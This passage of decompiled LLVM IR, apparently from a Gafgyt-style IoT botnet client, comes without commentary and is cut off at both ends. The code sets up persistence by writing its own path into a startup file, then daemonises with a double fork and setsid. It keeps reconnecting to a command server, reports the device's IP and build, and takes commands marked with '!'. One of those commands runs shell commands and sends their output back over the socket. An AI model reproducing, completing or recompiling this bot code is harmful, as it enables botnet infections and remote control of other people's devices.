  %v3_10c4c = call i32 @strlen(i8* %v1_10c48)
  %v0_10c54 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23838.949 to i32), i32* @r1, align 4
  %v3_10c60 = call i32 @strncpy(i32 %v0_10c54, i32 ptrtoint (i32* @global_var_23838.949 to i32), i32 %v3_10c4c)
  store i32 ptrtoint (i32* @global_var_23838.949 to i32), i32* %v1_10c2c, align 4
  %v0_10c9c = call i32 @prctl()
  %v2_10ca4 = call i32 @__GI_time(i32* null)
  store i32 %v2_10ca4, i32* @r4, align 4
  %v0_10cac = call i32 @__libc_getpid()
  %v0_10cb4 = load i32, i32* @r4, align 4
  %v2_10cb4 = xor i32 %v0_10cb4, %v0_10cac
  %v1_10cbc = call i32 @srand(i32 %v2_10cb4)
  %v2_10cc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_10cc4, i32* @r4, align 4
  %v0_10ccc = call i32 @__libc_getpid()
  %v0_10cd4 = load i32, i32* @r4, align 4
  %v2_10cd4 = xor i32 %v0_10cd4, %v0_10ccc
  %v1_10cdc = call i32 @init_rand(i32 %v2_10cd4)
  store i32 ptrtoint ([19 x i8]* @global_var_2383c.951 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_23850.953 to i32), i32* @r1, align 4
  %v3_10cf8 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_2383c.951 to i32), i32 ptrtoint ([2 x i8]* @global_var_23850.953 to i32))
  %v2_10d08 = icmp eq i32 %v3_10cf8, 0
  br i1 %v2_10d08, label %dec_label_pc_10d10, label %dec_label_pc_10d2c

dec_label_pc_10d10:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_23854.955 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_23850.953 to i32), i32* @r1, align 4
  %v3_10d20 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_23854.955 to i32), i32 ptrtoint ([2 x i8]* @global_var_23850.953 to i32))
  br label %dec_label_pc_10d2c

dec_label_pc_10d2c:                               ; preds = %entry, %dec_label_pc_10d10
  %stack_var_-88.0 = phi i32 [ %v3_10d20, %dec_label_pc_10d10 ], [ %v3_10cf8, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_23854.955, i32 0, i32 0), %dec_label_pc_10d10 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_2383c.951, i32 0, i32 0), %entry ]
  %v2_10d30 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_10d30, label %dec_label_pc_10ec8, label %dec_label_pc_10d38

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d2c
  %v2_10d48 = load i32, i32* %v1_10c2c, align 4
  %v1_10d4c = inttoptr i32 %v2_10d48 to i8*
  %v3_10d50 = call i32 @strlen(i8* %v1_10d4c)
  %v2_10d64 = ptrtoint i32* %stack_var_-368 to i32
  %v2_10d70 = call i32 @getcwd(i32 %v2_10d64, i32 256)
  store i32 ptrtoint (i32* @global_var_23864.957 to i32), i32* @r1, align 4
  %v2_10d80 = bitcast i32* %stack_var_-368 to i8*
  %v3_10d80 = call i32 @__GI_strcoll(i8* %v2_10d80, i32 ptrtoint (i32* @global_var_23864.957 to i32))
  %v2_10d88 = icmp eq i32 %v3_10d80, 0
  br i1 %v2_10d88, label %dec_label_pc_10ec0, label %dec_label_pc_10da0

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10da0
  %v1_10d98 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d38, %dec_label_pc_10d94
  %stack_var_-84.0 = phi i32 [ %v1_10d98, %dec_label_pc_10d94 ], [ %v3_10d50, %dec_label_pc_10d38 ]
  %v2_10db0 = load i32, i32* %v1_10c2c, align 4
  %v2_10db8 = add i32 %v2_10db0, %stack_var_-84.0
  %v1_10dbc = inttoptr i32 %v2_10db8 to i8*
  %v2_10dbc = load i8, i8* %v1_10dbc, align 1
  %v7_10dc0 = icmp eq i8 %v2_10dbc, 47
  br i1 %v7_10dc0, label %dec_label_pc_10dc8, label %dec_label_pc_10d94

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10da0
  %v2_10dd8 = load i32, i32* %v1_10c2c, align 4
  %v2_10de0 = add i32 %v2_10dd8, %stack_var_-84.0
  %v2_10de4 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_10de4, i32* @r0, align 4
  %v7_10df8 = call i32 @sprintf(i32 %v2_10de4, i32 ptrtoint ([8 x i8]* @global_var_23868.959 to i32), i32 %v2_10d64, i32 %v2_10de0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10e54 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_10e08 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_10e34 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_10e50.outer

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10e50
  %v3_10e18 = call i32 @fgets(i32 %v2_10e08, i32 1024, i32 %stack_var_-88.0)
  %v3_10e34 = call i32 @__GI_strcasecmp(i8* %v2_10e34, i32 %v2_10de4)
  %v2_10e3c = icmp eq i32 %v3_10e34, 0
  br i1 %v2_10e3c, label %dec_label_pc_10e44, label %dec_label_pc_10e50

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e00
  %v1_10e48 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_10e50.outer

dec_label_pc_10e50.outer:                         ; preds = %dec_label_pc_10e44, %dec_label_pc_10dc8
  %stack_var_-80.0.ph = phi i32 [ %v1_10e48, %dec_label_pc_10e44 ], [ 0, %dec_label_pc_10dc8 ]
  br label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e50.outer, %dec_label_pc_10e00
  %v2_10e54 = call i32 @feof(i8* %v1_10e54)
  %v2_10e5c = icmp eq i32 %v2_10e54, 0
  br i1 %v2_10e5c, label %dec_label_pc_10e00, label %dec_label_pc_10e64

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e50
  %v2_10e68 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_10e74 = call i32 @__GI_fclose(i8* %v1_10e54)
  br i1 %v2_10e68, label %dec_label_pc_10e70, label %dec_label_pc_10ec8

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10e64
  %v4_10e78 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_10e78, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23870.961 to i32), i32* @r1, align 4
  %v3_10e80 = call i32 @__GI_fopen(i32 %v4_10e78, i32 ptrtoint (i32* @global_var_23870.961 to i32))
  %v2_10e90 = icmp eq i32 %v3_10e80, 0
  br i1 %v2_10e90, label %dec_label_pc_10ec8, label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %dec_label_pc_10e70
  %v2_10ea4 = call i32 @__GI_fputs(i32 %v2_10de4, i32 %v3_10e80)
  %v1_10eac = inttoptr i32 %v3_10e80 to i8*
  %v2_10eac = call i32 @__GI_fclose(i8* %v1_10eac)
  br label %dec_label_pc_10ec8

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10d38
  %v1_10ec4 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_10ec4 = call i32 @__GI_fclose(i8* %v1_10ec4)
  br label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10e64, %dec_label_pc_10e70, %dec_label_pc_10d2c, %dec_label_pc_10e98, %dec_label_pc_10ec0
  %v0_10ec8 = call i32 @getOurIP()
  %v0_10ecc = call i32 @__libc_fork()
  %v2_10edc = icmp eq i32 %v0_10ecc, 0
  br i1 %v2_10edc, label %dec_label_pc_10f0c, label %dec_label_pc_10f48

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10ec8
  %v0_10f0c = call i32 @__libc_fork()
  %v2_10f1c = icmp eq i32 %v0_10f0c, 0
  br i1 %v2_10f1c, label %dec_label_pc_10f2c.thread, label %dec_label_pc_10f38

dec_label_pc_10f2c.thread:                        ; preds = %dec_label_pc_10f0c
  br label %dec_label_pc_10f54

dec_label_pc_10f38:                               ; preds = %dec_label_pc_10f0c
  %v1_10f28 = call i32 @__GI_exit(i32 0)
  %v2_10f40 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_23874.963 to i32))
  br label %dec_label_pc_10f54

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10ec8
  %v2_10ee4 = ptrtoint i32* %stack_var_-112 to i32
  %v3_10ef4 = call i32 @__libc_waitpid(i32 %v0_10ecc, i32 %v2_10ee4, i32 0)
  %v1_10efc = call i32 @__GI_exit(i32 0)
  %v2_10f50 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_23874.963 to i32))
  br label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f2c.thread, %dec_label_pc_10f38, %dec_label_pc_10f48
  %v0_10f54 = call i32 @__GI_setsid()
  %v0_10f5c = call i32 @chdir()
  %v2_10f68 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1180c = ptrtoint i32* %stack_var_-5744 to i32
  %v4_1181c = bitcast i32* %stack_var_-5744 to i8*
  %v2_112b4 = add i32 %v19_10be4, -5720
  %v2_11574 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_11584 = bitcast i32* %stack_var_-1648 to i8*
  %v1_113f8 = or i32 %v2_1180c, 1
  %v5_113fc = inttoptr i32 %v1_113f8 to i8*
  %v2_11418 = or i32 %v2_1180c, 2
  %v2_116d8 = add i32 %v19_10be4, -600
  br label %dec_label_pc_10f70.outer

dec_label_pc_10f70.outer:                         ; preds = %dec_label_pc_11350, %dec_label_pc_117fc, %dec_label_pc_10f54
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_10f54 ], [ %stack_var_-96.2.ph, %dec_label_pc_117fc ], [ %v1_11354, %dec_label_pc_11350 ]
  %v0_10f7024 = call i32 @initConnection()
  %v2_10f7826 = icmp eq i32 %v0_10f7024, 0
  br i1 %v2_10f7826, label %dec_label_pc_10f8c, label %dec_label_pc_10f80

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f70.outer, %dec_label_pc_10f80
  %v1_10f84 = call i32 @sleep(i32 30)
  %v0_10f70 = call i32 @initConnection()
  %v2_10f78 = icmp eq i32 %v0_10f70, 0
  br i1 %v2_10f78, label %dec_label_pc_10f8c, label %dec_label_pc_10f80

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f80, %dec_label_pc_10f70.outer
  %v2_10f90 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_10f90, i32* @r4, align 4
  %v0_10f94 = call i32 @getBuild()
  store i32 %v0_10f94, i32* @r5, align 4
  %v2_10fa0 = load i32, i32* @global_var_33880.317, align 4
  store i32 %v2_10fa0, i32* @r0, align 4
  %v1_10fa4 = call i32 @__GI_inet_ntoa(i32 %v2_10fa0)
  %v0_10fac = load i32, i32* @r4, align 4
  %v0_10fb4 = load i32, i32* @r5, align 4
  store i32 %v0_10fb4, i32* @r2, align 4
  %v3_10fb8 = call i32 @sockprintf(i32 %v0_10fac, i32 ptrtoint ([16 x i8]* @global_var_23884.967 to i32))
  br label %dec_label_pc_117fc.outer

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_1128c, %dec_label_pc_11238
  %v3_10fe0 = mul i32 %v3_11280, 4
  %v2_10fec = load i32, i32* @global_var_3388c.76, align 4
  %v2_10ff0 = add i32 %v2_10fec, %v3_10fe0
  %v1_10ff4 = inttoptr i32 %v2_10ff0 to i32*
  %v2_10ff4 = load i32, i32* %v1_10ff4, align 4
  %v3_11004 = call i32 @__libc_waitpid(i32 %v2_10ff4, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_11004, 1
  br i1 %tmp111, label %dec_label_pc_1122c, label %dec_label_pc_1106c

dec_label_pc_11024:                               ; preds = %dec_label_pc_110c8, %dec_label_pc_1106c
  %v3_11028 = mul i32 %v1_11018, 4
  %v2_11034 = load i32, i32* @global_var_3388c.76, align 4
  %v2_11038 = add i32 %v2_11034, %v3_11028
  %v1_1103c = add i32 %v2_11038, -4
  %v1_11058 = inttoptr i32 %v2_11038 to i32*
  %v2_11058 = load i32, i32* %v1_11058, align 4
  %v2_1105c = inttoptr i32 %v1_1103c to i32*
  store i32 %v2_11058, i32* %v2_1105c, align 4
  br label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_10fdc, %dec_label_pc_11024
  %v3_11014.sink = phi i32 [ %v1_11018, %dec_label_pc_11024 ], [ %v3_11280, %dec_label_pc_10fdc ]
  %v1_11018 = add i32 %v3_11014.sink, 1
  %v2_11088 = load i32, i32* @global_var_2d60c.73, align 4
  %v5_11088 = load i32, i32* @global_var_2d610.74, align 4
  %tmp112 = icmp ugt i32 %v5_11088, %v1_11018
  br i1 %tmp112, label %dec_label_pc_11024, label %dec_label_pc_110b0

dec_label_pc_110b0:                               ; preds = %dec_label_pc_1106c
  %v9_110c0 = icmp eq i32 %v5_11088, %v1_11018
  br i1 %v9_110c0, label %dec_label_pc_110c8, label %dec_label_pc_110e0

dec_label_pc_110c8:                               ; preds = %dec_label_pc_110b0
  %v9_110d8 = icmp eq i32 %v2_11088, 0
  br i1 %v9_110d8, label %dec_label_pc_110e0, label %dec_label_pc_11024

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110c8, %dec_label_pc_110b0
  %v3_110e4 = mul i32 %v1_11018, 4
  %v2_110f0 = load i32, i32* @global_var_3388c.76, align 4
  %v2_110f4 = add i32 %v3_110e4, -4
  %v1_110f8 = add i32 %v2_110f4, %v2_110f0
  %v2_11100 = inttoptr i32 %v1_110f8 to i32*
  store i32 0, i32* %v2_11100, align 4
  %v2_11108 = load i32, i32* @global_var_2d60c.73, align 4
  %v5_11108 = load i32, i32* @global_var_2d610.74, align 4
  %v2_11114 = add i32 %v2_11108, -1
  %v3_11114 = icmp ne i32 %v2_11108, 0
  %v3_11118 = add i32 %v5_11108, -1
  %v4_11118 = zext i1 %v3_11114 to i32
  %v5_11118 = add i32 %v3_11118, %v4_11118
  store i32 %v2_11114, i32* @global_var_2d60c.73, align 4
  store i32 %v5_11118, i32* @global_var_2d610.74, align 4
  %v3_1112c = udiv i32 %v2_11114, 1073741824
  %v3_11130 = mul i32 %v5_11118, 4
  %v2_11134 = or i32 %v3_11130, %v3_1112c
  store i32 %v2_11134, i32* @r4, align 4
  %v3_11138 = mul i32 %v2_11114, 4
  %v1_1113c = add i32 %v3_11138, 4
  %v1_11144 = call i32 @malloc(i32 %v1_1113c)
  br label %dec_label_pc_1119c

dec_label_pc_1115c:                               ; preds = %dec_label_pc_111f8, %dec_label_pc_1119c
  %v3_11160 = mul i32 %v3_111ec, 4
  %v2_1116c = add i32 %v3_11160, %v1_11144
  %v2_11180 = load i32, i32* @global_var_3388c.76, align 4
  %v2_11184 = add i32 %v2_11180, %v3_11160
  %v1_11188 = inttoptr i32 %v2_11184 to i32*
  %v2_11188 = load i32, i32* %v1_11188, align 4
  %v2_1118c = inttoptr i32 %v2_1116c to i32*
  store i32 %v2_11188, i32* %v2_1118c, align 4
  %v1_11194 = add i32 %v3_111ec, 1
  br label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_110e0, %dec_label_pc_1115c
  %v3_111ec = phi i32 [ 0, %dec_label_pc_110e0 ], [ %v1_11194, %dec_label_pc_1115c ]
  %v2_111b8 = load i32, i32* @global_var_2d60c.73, align 4
  %v5_111b8 = load i32, i32* @global_var_2d610.74, align 4
  %tmp113 = icmp ugt i32 %v5_111b8, %v3_111ec
  br i1 %tmp113, label %dec_label_pc_1115c, label %dec_label_pc_111e0

dec_label_pc_111e0:                               ; preds = %dec_label_pc_1119c
  %v9_111f0 = icmp eq i32 %v5_111b8, %v3_111ec
  br i1 %v9_111f0, label %dec_label_pc_111f8, label %dec_label_pc_11210

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111e0
  %v9_11208 = icmp eq i32 %v2_111b8, 0
  br i1 %v9_11208, label %dec_label_pc_11210, label %dec_label_pc_1115c

dec_label_pc_11210:                               ; preds = %dec_label_pc_111f8, %dec_label_pc_111e0
  %v2_11214 = load i32, i32* @global_var_3388c.76, align 4
  store i32 %v2_11214, i32* @r0, align 4
  %v0_1121c = call i32 @free()
  store i32 %v1_11144, i32* @global_var_3388c.76, align 4
  br label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_10fdc, %dec_label_pc_11210
  %v1_11230 = add i32 %v3_11280, 1
  br label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_1122c
  %v3_11280 = phi i32 [ %v1_11230, %dec_label_pc_1122c ], [ 0, %dec_label_pc_117fc ]
  %v3_11240 = ashr i32 %v3_11280, 31
  %v2_11250 = load i32, i32* @global_var_2d60c.73, align 4
  %v5_11250 = load i32, i32* @global_var_2d610.74, align 4
  %v3_1126c = icmp uge i32 %v5_11250, %v3_11280
  %v9_1126c = icmp eq i32 %v5_11250, %v3_11280
  %v2_11270 = xor i1 %v9_1126c, true
  %v3_11270 = and i1 %v3_1126c, %v2_11270
  br i1 %v3_11270, label %dec_label_pc_10fdc, label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_11238
  br i1 %v9_1126c, label %dec_label_pc_1128c, label %dec_label_pc_112a4

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11274
  %tmp = icmp ugt i32 %v2_11250, %v3_11240
  br i1 %tmp, label %dec_label_pc_10fdc, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_11274, %dec_label_pc_1128c
  %v2_112b8 = add i32 %v2_112b4, %v5_1181c
  %v3_112c0 = inttoptr i32 %v2_112b8 to i8*
  store i8 0, i8* %v3_112c0, align 1
  %v2_112d4 = call i32 @trim(i8* %v4_1181c)
  %v4_112ec = call i32 @strstr(i32 %v2_1180c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b33c.57, i32 0, i32 0))
  store i32 %v4_112ec, i32* @r2, align 4
  %v9_11300 = icmp eq i32 %v4_112ec, %v2_1180c
  br i1 %v9_11300, label %dec_label_pc_11308, label %dec_label_pc_11320

dec_label_pc_11308:                               ; preds = %dec_label_pc_112a4
  %v2_1130c = load i32, i32* @global_var_2d604.55, align 4
  %v3_11318 = call i32 @sockprintf(i32 %v2_1130c, i32 ptrtoint ([5 x i8]* @global_var_23894.972 to i32))
  br label %dec_label_pc_117fc

dec_label_pc_11320:                               ; preds = %dec_label_pc_112a4
  %v6_11334 = call i32 @strstr(i32 %v2_1180c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2389c.974, i32 0, i32 0))
  %v9_11348 = icmp eq i32 %v6_11334, %v2_1180c
  br i1 %v9_11348, label %dec_label_pc_11350, label %dec_label_pc_1137c

dec_label_pc_11350:                               ; preds = %dec_label_pc_11320
  %v1_11354 = add i32 %stack_var_-96.2.ph, 1
  %v2_11364 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_238a0.976 to i32))
  %v7_11370 = icmp slt i32 %v1_11354, 21
  br i1 %v7_11370, label %dec_label_pc_10f70.outer, label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_11350
  %v1_11378 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %dec_label_pc_11320, %dec_label_pc_11374
  %stack_var_-96.1 = phi i32 [ %v1_11354, %dec_label_pc_11374 ], [ %stack_var_-96.2.ph, %dec_label_pc_11320 ]
  %v2_11390 = load i8, i8* %v4_1181c, align 4
  %v7_11394 = icmp eq i8 %v2_11390, 33
  br i1 %v7_11394, label %dec_label_pc_113b8, label %dec_label_pc_117fc.outer

dec_label_pc_113b8:                               ; preds = %dec_label_pc_1137c, %dec_label_pc_113c8
  %v3_1139c.sink = phi i8* [ %storemerge8, %dec_label_pc_113c8 ], [ %v4_1181c, %dec_label_pc_1137c ]
  %v4_1139c = ptrtoint i8* %v3_1139c.sink to i32
  %v1_113a0 = add i32 %v4_1139c, 1
  %storemerge8 = inttoptr i32 %v1_113a0 to i8*
  %v2_113bc = load i8, i8* %storemerge8, align 1
  %v7_113c0 = icmp eq i8 %v2_113bc, 32
  br i1 %v7_113c0, label %dec_label_pc_113d8, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113b8
  %v2_113cc = load i8, i8* %storemerge8, align 1
  %v2_113d0 = icmp eq i8 %v2_113cc, 0
  br i1 %v2_113d0, label %dec_label_pc_113d8, label %dec_label_pc_113b8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113c8, %dec_label_pc_113b8
  %v2_113dc = load i8, i8* %storemerge8, align 1
  %v2_113e0 = icmp eq i8 %v2_113dc, 0
  br i1 %v2_113e0, label %dec_label_pc_117fc.outer, label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113d8
  store i8 0, i8* %storemerge8, align 1
  %v3_11408 = call i32 @strlen(i8* %v5_113fc)
  %v1_1141c = add i32 %v3_11408, %v2_11418
  %v5_11420 = inttoptr i32 %v1_1141c to i8*
  %v2_11468 = add i32 %v1_1141c, -1
  br label %dec_label_pc_11450

dec_label_pc_11428:                               ; preds = %dec_label_pc_1147c, %dec_label_pc_11450
  %v3_11430 = call i32 @strlen(i8* %v5_11420)
  %v1_11444 = add i32 %v2_11468, %v3_11430
  %v3_1144c = inttoptr i32 %v1_11444 to i8*
  store i8 0, i8* %v3_1144c, align 1
  br label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_11428
  %v3_11458 = call i32 @strlen(i8* %v5_11420)
  %v1_1146c = add i32 %v3_11458, %v2_11468
  %v1_11470 = inttoptr i32 %v1_1146c to i8*
  %v2_11470 = load i8, i8* %v1_11470, align 1
  %v7_11474 = icmp eq i8 %v2_11470, 10
  br i1 %v7_11474, label %dec_label_pc_11428, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_11450
  %v3_11484 = call i32 @strlen(i8* %v5_11420)
  %v1_11498 = add i32 %v3_11484, %v2_11468
  %v1_1149c = inttoptr i32 %v1_11498 to i8*
  %v2_1149c = load i8, i8* %v1_1149c, align 1
  %v7_114a0 = icmp eq i8 %v2_1149c, 13
  br i1 %v7_114a0, label %dec_label_pc_11428, label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %dec_label_pc_1147c
  %v2_114c428 = load i8, i8* %v5_11420, align 1
  %v7_114c832 = icmp eq i8 %v2_114c428, 32
  br i1 %v7_114c832, label %dec_label_pc_114e0, label %dec_label_pc_114d0

dec_label_pc_114b4:                               ; preds = %dec_label_pc_114d0
  %v1_114b8 = add i32 %v4_114c034, 1
  %v5_114bc = inttoptr i32 %v1_114b8 to i8*
  %v2_114c4 = load i8, i8* %v5_114bc, align 1
  %v7_114c8 = icmp eq i8 %v2_114c4, 32
  br i1 %v7_114c8, label %dec_label_pc_114e0, label %dec_label_pc_114d0

dec_label_pc_114d0:                               ; preds = %dec_label_pc_114a8, %dec_label_pc_114b4
  %v4_114c034 = phi i32 [ %v1_114b8, %dec_label_pc_114b4 ], [ %v1_1141c, %dec_label_pc_114a8 ]
  %stack_var_-64.033 = phi i8* [ %v5_114bc, %dec_label_pc_114b4 ], [ %v5_11420, %dec_label_pc_114a8 ]
  %v2_114d4 = load i8, i8* %stack_var_-64.033, align 1
  %v2_114d8 = icmp eq i8 %v2_114d4, 0
  br i1 %v2_114d8, label %dec_label_pc_114e0, label %dec_label_pc_114b4

dec_label_pc_114e0:                               ; preds = %dec_label_pc_114b4, %dec_label_pc_114d0, %dec_label_pc_114a8
  %stack_var_-64.0.lcssa = phi i8* [ %v5_11420, %dec_label_pc_114a8 ], [ %v5_114bc, %dec_label_pc_114b4 ], [ %stack_var_-64.033, %dec_label_pc_114d0 ]
  %v4_114c0.lcssa = phi i32 [ %v1_1141c, %dec_label_pc_114a8 ], [ %v1_114b8, %dec_label_pc_114b4 ], [ %v4_114c034, %dec_label_pc_114d0 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_114f0 = add i32 %v4_114c0.lcssa, 1
  %v2_1153439 = load i8, i8* %v5_11420, align 1
  %v2_1153841 = icmp eq i8 %v2_1153439, 0
  br i1 %v2_1153841, label %dec_label_pc_11540, label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %dec_label_pc_114e0, %dec_label_pc_11504
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_11504 ], [ %v5_11420, %dec_label_pc_114e0 ]
  %storemerge1442 = phi i32 [ %v1_11528, %dec_label_pc_11504 ], [ %v1_1141c, %dec_label_pc_114e0 ]
  %v2_11508 = load i8, i8* %storemerge743, align 1
  %v3_11508 = zext i8 %v2_11508 to i32
  %v1_11510 = call i32 @__GI_toupper(i32 %v3_11508)
  %v1_11520 = trunc i32 %v1_11510 to i8
  store i8 %v1_11520, i8* %storemerge743, align 1
  %v1_11528 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_11528 to i8*
  %v2_11534 = load i8, i8* %storemerge7, align 1
  %v2_11538 = icmp eq i8 %v2_11534, 0
  br i1 %v2_11538, label %dec_label_pc_11540, label %dec_label_pc_11504

dec_label_pc_11540:                               ; preds = %dec_label_pc_11504, %dec_label_pc_114e0
  store i32 ptrtoint ([3 x i8]* @global_var_238b4.978 to i32), i32* @r1, align 4
  %v4_1154c = call i32 @__GI_strcoll(i8* %v5_11420, i32 ptrtoint ([3 x i8]* @global_var_238b4.978 to i32))
  %v2_11554 = icmp eq i32 %v4_1154c, 0
  br i1 %v2_11554, label %dec_label_pc_1155c, label %dec_label_pc_11664

dec_label_pc_1155c:                               ; preds = %dec_label_pc_11540
  %v0_1155c = call i32 @listFork()
  %v2_11564 = icmp eq i32 %v0_1155c, 0
  br i1 %v2_11564, label %dec_label_pc_1156c, label %dec_label_pc_117fc.outer

dec_label_pc_1156c:                               ; preds = %dec_label_pc_1155c
  store i32 1024, i32* @r2, align 4
  %v3_11584 = call i32 @__GI_memset(i8* %v2_11584, i32 0)
  %v6_115a4 = call i32 @szprintf(i32 %v2_11574, i32 ptrtoint ([8 x i8]* @global_var_238b8.980 to i32), i32 %v1_114f0, i32 %v2_11574, i32 ptrtoint (i32* @0 to i32))
  %v3_115c0 = call i32 @fdpopen(i32 %v2_11574, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_23850.953, i32 0, i32 0))
  br label %dec_label_pc_1162c

dec_label_pc_115d0:                               ; preds = %dec_label_pc_1162c
  %v2_115e0 = call i32 @trim(i8* %v2_11584)
  %v2_115e8 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_11574, i32* @r2, align 4
  %v3_11604 = call i32 @sockprintf(i32 %v2_115e8, i32 ptrtoint ([3 x i8]* @global_var_238c0.982 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_11620 = call i32 @__GI_memset(i8* %v2_11584, i32 0)
  %v1_11628 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %dec_label_pc_1156c, %dec_label_pc_115d0
  %v4_11644 = call i32 @fdgets(i32 %v2_11574, i32 1024, i32 %v3_115c0, i32 %v2_11574)
  %v2_1164c = icmp eq i32 %v4_11644, 0
  br i1 %v2_1164c, label %dec_label_pc_11654, label %dec_label_pc_115d0

dec_label_pc_11654:                               ; preds = %dec_label_pc_1162c
  %v1_11658 = call i32 @fdpclose(i32 %v3_115c0)
  %v1_11660 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %dec_label_pc_11540, %dec_label_pc_11654
  store i32 %v1_114f0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_238c4.984 to i32), i32* @r1, align 4
  %v2_11678 = call i32 @__GI_strtok(i32 %v1_114f0, i32 ptrtoint (i32* @global_var_238c4.984 to i32))
  store i32 %v1_1141c, i32* %stack_var_-624, align 4
  %v2_1178046 = icmp eq i32 %v2_11678, 0
  br i1 %v2_1178046, label %dec_label_pc_11788, label %dec_label_pc_11690

dec_label_pc_11690:                               ; preds = %dec_label_pc_11664, %dec_label_pc_11768
  %stack_var_-36.049.in = phi i32 [ %v2_11770, %dec_label_pc_11768 ], [ %v2_11678, %dec_label_pc_11664 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_11768 ], [ 1, %dec_label_pc_11664 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_11694 = load i8, i8* %stack_var_-36.049, align 1
  %v7_11698 = icmp eq i8 %v2_11694, 10
  br i1 %v7_11698, label %dec_label_pc_11768, label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %dec_label_pc_11690
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_116ac = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_116b4 = add i32 %v3_116ac, 1
  %v1_116bc = call i32 @malloc(i32 %v1_116b4)
  %v0_116d0 = load i32, i32* @r4, align 4
  %v3_116d0 = mul i32 %v0_116d0, 4
  %v2_116dc = add i32 %v2_116d8, %v3_116d0
  %v2_116e0 = inttoptr i32 %v2_116dc to i32*
  store i32 %v1_116bc, i32* %v2_116e0, align 4
  %v3_116f0 = mul i32 %stack_var_-40.147, 4
